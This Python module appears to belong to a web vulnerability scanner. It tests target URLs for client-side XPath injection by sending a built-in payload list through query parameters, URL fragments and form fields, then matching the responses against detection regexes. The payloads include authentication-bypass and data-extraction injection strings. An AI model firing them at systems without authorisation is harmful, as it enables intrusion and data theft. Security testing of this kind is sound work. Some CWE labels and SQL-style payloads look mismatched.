"""
Client-side XPath Injection Scanner - Detects DOM-based XPath injection vulnerabilities
Covers CWE-79, CWE-116, CWE-159 for reflected, stored, and DOM-based scenarios
"""

import re
import time
import logging
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Any, Optional
from core.config.config_manager import ConfigManager
from core.reporting.report_generator import Finding, Severity
from core.utils.logger import get_security_logger
from scanners.base_scanner import BaseScanner

logger = logging.getLogger(__name__)
security_logger = get_security_logger()

class ClientSideXPathInjectionScanner(BaseScanner):
    """Client-side XPath injection vulnerability scanner for DOM-based attacks."""

    def __init__(self, config_manager: ConfigManager):
        """
        Initialize the client-side XPath injection scanner.

        Args:
            config_manager: Configuration manager instance
        """
        super().__init__(config_manager)
        self.config = config_manager.get_scanner_config('client_xpath')
        self.general_config = config_manager.get('general', {})

        # Client-side XPath injection payloads
        self.dom_payloads = [
            # Basic XPath injection patterns for client-side
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "' or 1=1#",
            "' or 1=1--",
            "admin' or '1'='1' #",
            
            # XPath function injection
            "'] | //user | //password | //admin[('",
            "') or 1=1 or ('a'='a",
            "count(/child::node())",
            "string-length('test')",
            
            # XPath axis injection
            "ancestor::node()",
            "descendant::node()",
            "following::node()",
            "preceding::node()",
            
            # Boolean-based blind XPath injection
            "' and count(/*)>0 and '1'='1",
            "' and string-length(name(/*[1]))>0 and '1'='1",
            
            # Error-based patterns
            "' and extractvalue(1, concat(0x7e, version(), 0x7e)) and '1'='1",
            "' and updatexml(1, concat(0x7e, user(), 0x7e), 1) and '1'='1"
        ]

        # JavaScript patterns that indicate XPath usage
        self.xpath_js_patterns = [
            r'evaluate\s*\(',
            r'selectNodes\s*\(',
            r'selectSingleNode\s*\(',
            r'document\.evaluate',
            r'XPathResult',
            r'XPathExpression',
            r'createExpression\s*\(',
            r'xpath',
            r'XPath',
            r'//[^/]',  # XPath expressions
            r'node\(\)',
            r'text\(\)',
            r'@\w+',  # XPath attribute selectors
        ]

        # DOM manipulation patterns that could be vulnerable
        self.dom_sink_patterns = [
            r'innerHTML',
            r'outerHTML',
            r'insertAdjacentHTML',
            r'document\.write',
            r'document\.writeln',
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
        ]

        # Error signatures for client-side XPath errors
        self.client_error_signatures = [
            r"SyntaxError.*XPath",
            r"InvalidExpressionError",
            r"XPathException",
            r"TypeError.*XPath",
            r"Error.*xpath",
            r"DOMException.*INVALID_EXPRESSION_ERR",
            r"NS_ERROR_DOM_INVALID_EXPRESSION_ERR",
        ]

    def scan(self, target: str, **kwargs) -> List[Finding]:
        """
        Scan for client-side XPath injection vulnerabilities.

        Args:
            target: Target URL to scan
            **kwargs: Additional parameters

        Returns:
            List of findings
        """
        findings = []
        
        try:
            logger.info(f"Starting client-side XPath injection scan on {target}")
            
            # Test for DOM-based XPath injection
            findings.extend(self._test_dom_xpath_injection(target))
            
            # Test for reflected DOM-based XPath injection
            findings.extend(self._test_reflected_dom_xpath_injection(target))
            
            # Test for stored DOM-based XPath injection
            findings.extend(self._test_stored_dom_xpath_injection(target))
            
            logger.info(f"Client-side XPath injection scan completed. Found {len(findings)} potential vulnerabilities.")
            
        except Exception as e:
            logger.error(f"Error during client-side XPath injection scan: {str(e)}")
            
        return findings

    def _test_dom_xpath_injection(self, target: str) -> List[Finding]:
        """Test for DOM-based XPath injection vulnerabilities."""
        findings = []
        
        try:
            # First, check if the page uses XPath in JavaScript
            response = requests.get(target, timeout=self.general_config.get('timeout', 30))
            
            if response.status_code != 200:
                return findings
                
            page_content = response.text
            
            # Check for XPath usage in JavaScript
            xpath_usage_found = any(re.search(pattern, page_content, re.IGNORECASE) 
                                  for pattern in self.xpath_js_patterns)
            
            if not xpath_usage_found:
                logger.debug(f"No XPath usage detected in JavaScript for {target}")
                return findings
                
            # Test XPath injection in URL fragments and parameters
            for payload in self.dom_payloads:
                # Test in URL fragment (hash)
                test_url = f"{target}#{payload}"
                finding = self._test_xpath_payload(test_url, payload, "DOM-based")
                if finding:
                    findings.append(finding)
                
                # Test in URL parameters
                parsed_url = urlparse(target)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    for param in params.keys():
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        if test_params:
                            query_string = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                            test_url += f"?{query_string}"
                        
                        finding = self._test_xpath_payload(test_url, payload, "DOM-based")
                        if finding:
                            findings.append(finding)
                            
        except Exception as e:
            logger.error(f"Error testing DOM-based XPath injection: {str(e)}")
            
        return findings

    def _test_reflected_dom_xpath_injection(self, target: str) -> List[Finding]:
        """Test for reflected DOM-based XPath injection vulnerabilities."""
        findings = []
        
        try:
            # Test XPath injection in URL parameters that get reflected in JavaScript
            parsed_url = urlparse(target)
            
            # Add test parameters if none exist
            test_params = ['q', 'search', 'query', 'filter', 'id', 'name']
            
            for param in test_params:
                for payload in self.dom_payloads:
                    test_url = f"{target}{'&' if parsed_url.query else '?'}{param}={payload}"
                    
                    response = requests.get(test_url, timeout=self.general_config.get('timeout', 30))
                    
                    if response.status_code == 200:
                        # Check if payload is reflected in JavaScript context
                        if self._is_payload_in_js_context(response.text, payload):
                            # Check for XPath usage
                            xpath_usage_found = any(re.search(pattern, response.text, re.IGNORECASE) 
                                                  for pattern in self.xpath_js_patterns)
                            
                            if xpath_usage_found:
                                confidence = 0.6
                                
                                finding = Finding(
                                    title="Client-side XPath Injection (Reflected DOM-based)",
                                    severity=Severity.MEDIUM,
                                    confidence=confidence,
                                    description=f"Reflected DOM-based XPath injection detected. Parameter '{param}' is reflected in JavaScript context where XPath operations are performed.",
                                    target=test_url,
                                    vulnerability_type="Client-side XPath Injection",
                                    payload=payload,
                                    evidence=f"Payload reflected in JavaScript context with XPath usage",
                                    impact="An attacker could potentially manipulate XPath queries on the client-side to extract sensitive information or bypass authentication.",
                                    remediation="Properly validate and encode all user input before using in XPath expressions. Use parameterized XPath queries when possible.",
                                    cwe_ids=["CWE-79", "CWE-116", "CWE-159"]
                                )
                                
                                findings.append(finding)
                                security_logger.log_vulnerability_found("CLIENT_XPATH_REFLECTED", target, "MEDIUM", confidence)
                                break
                                
        except Exception as e:
            logger.error(f"Error testing reflected DOM-based XPath injection: {str(e)}")
            
        return findings

    def _test_stored_dom_xpath_injection(self, target: str) -> List[Finding]:
        """Test for stored DOM-based XPath injection vulnerabilities."""
        findings = []
        
        try:
            # Look for forms or input fields that might store data
            response = requests.get(target, timeout=self.general_config.get('timeout', 30))
            
            if response.status_code != 200:
                return findings
                
            # Find forms in the page
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
            
            for form_content in forms:
                # Look for input fields
                input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
                input_names = re.findall(input_pattern, form_content, re.IGNORECASE)
                
                for input_name in input_names:
                    for payload in self.dom_payloads:
                        # Submit payload to form
                        form_data = {input_name: payload}
                        
                        try:
                            post_response = requests.post(target, data=form_data, 
                                                        timeout=self.general_config.get('timeout', 30))
                            
                            if post_response.status_code == 200:
                                # Check if stored data is used in XPath operations
                                xpath_usage_found = any(re.search(pattern, post_response.text, re.IGNORECASE) 
                                                      for pattern in self.xpath_js_patterns)
                                
                                # Check for XPath error patterns
                                error_found = any(re.search(pattern, post_response.text, re.IGNORECASE) 
                                                for pattern in self.client_error_signatures)
                                
                                if xpath_usage_found or error_found:
                                    confidence = 0.7 if error_found else 0.5
                                    
                                    finding = Finding(
                                        title="Client-side XPath Injection (Stored DOM-based)",
                                        severity=Severity.MEDIUM,
                                        confidence=confidence,
                                        description=f"Stored DOM-based XPath injection detected in field '{input_name}'. Stored data is used in client-side XPath operations.",
                                        target=target,
                                        vulnerability_type="Client-side XPath Injection",
                                        payload=payload,
                                        evidence=f"XPath usage detected with stored input in field '{input_name}'",
                                        impact="An attacker could store malicious XPath expressions that get executed when other users visit the page, potentially leading to information disclosure or authentication bypass.",
                                        remediation="Validate and encode all stored data before using in XPath expressions. Implement proper input sanitization and output encoding.",
                                        cwe_ids=["CWE-79", "CWE-116", "CWE-159"]
                                    )
                                    
                                    findings.append(finding)
                                    security_logger.log_vulnerability_found("CLIENT_XPATH_STORED", target, "MEDIUM", confidence)
                                    break
                                    
                        except Exception as e:
                            logger.debug(f"Error submitting form data: {str(e)}")
                            
        except Exception as e:
            logger.error(f"Error testing stored DOM-based XPath injection: {str(e)}")
            
        return findings

    def _test_xpath_payload(self, test_url: str, payload: str, injection_type: str) -> Optional[Finding]:
        """Test a specific XPath payload and return finding if vulnerability detected."""
        try:
            response = requests.get(test_url, timeout=self.general_config.get('timeout', 30))
            
            if response.status_code == 200:
                # Check for XPath error patterns in response
                error_found = any(re.search(pattern, response.text, re.IGNORECASE) 
                                for pattern in self.client_error_signatures)
                
                # Check for XPath usage patterns
                xpath_usage_found = any(re.search(pattern, response.text, re.IGNORECASE) 
                                      for pattern in self.xpath_js_patterns)
                
                # Check for DOM sinks that could be exploited
                dom_sink_found = any(re.search(pattern, response.text, re.IGNORECASE) 
                                   for pattern in self.dom_sink_patterns)
                
                if error_found or (xpath_usage_found and dom_sink_found):
                    confidence = 0.8 if error_found else 0.5
                    
                    return Finding(
                        title=f"Client-side XPath Injection ({injection_type})",
                        severity=Severity.MEDIUM,
                        confidence=confidence,
                        description=f"{injection_type} XPath injection vulnerability detected. The application uses client-side XPath operations that may be exploitable.",
                        target=test_url,
                        vulnerability_type="Client-side XPath Injection",
                        payload=payload,
                        evidence="XPath error patterns or vulnerable usage detected in client-side code",
                        impact="An attacker could potentially manipulate XPath queries to extract sensitive information from XML documents or bypass authentication mechanisms.",
                        remediation="Implement proper input validation and encoding. Use parameterized XPath queries and avoid dynamic XPath expression construction with user input.",
                        cwe_ids=["CWE-79", "CWE-116", "CWE-159"]
                    )
                    
        except Exception as e:
            logger.debug(f"Error testing XPath payload {payload}: {str(e)}")
            
        return None

    def _is_payload_in_js_context(self, content: str, payload: str) -> bool:
        """Check if payload appears in JavaScript context."""
        # Look for payload within <script> tags or JavaScript event handlers
        js_contexts = [
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            r'on\w+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']',
        ]
        
        return any(re.search(pattern, content, re.DOTALL | re.IGNORECASE) 
                  for pattern in js_contexts)

    def _load_payloads(self) -> List[str]:
        """Load XPath injection payloads from file."""
        try:
            with open('payloads/xpath_payloads.txt', 'r') as f:
                payloads = [line.strip() for line in f.readlines() if line.strip() and not line.startswith('#')]
            return payloads + self.dom_payloads
        except Exception as e:
            logger.warning(f"Could not load XPath payloads from file: {str(e)}")
            return self.dom_payloads
